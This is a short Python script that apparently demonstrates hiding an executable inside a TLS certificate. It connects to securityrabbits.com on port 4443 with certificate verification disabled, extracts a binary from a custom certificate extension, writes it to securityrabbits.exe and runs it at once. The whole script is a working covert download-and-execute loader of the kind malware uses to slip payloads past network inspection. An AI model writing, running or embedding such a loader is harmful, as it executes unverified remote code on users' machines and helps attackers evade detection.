import subprocess
import ssl, socket
from cryptography import x509
from cryptography.hazmat.backends import default_backend

print("Getting SSL certificate from SecurityRabbits.com...")
hostname    = 'securityrabbits.com'
ctx         = ssl._create_unverified_context()
with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
    s.connect((hostname, 4443))
    cert_der = s.getpeercert(binary_form=True)
cert        = x509.load_der_x509_certificate(cert_der, backend=default_backend())
payload     = cert.extensions.get_extension_for_oid(x509.ObjectIdentifier("1.2.3.4.5.6")).value.value
with open("securityrabbits.exe", "wb") as f:
    f.write(payload)

print("SecurityRabbits.exe is ready.\nRunning...\n")
subprocess.run(["SecurityRabbits.exe"])
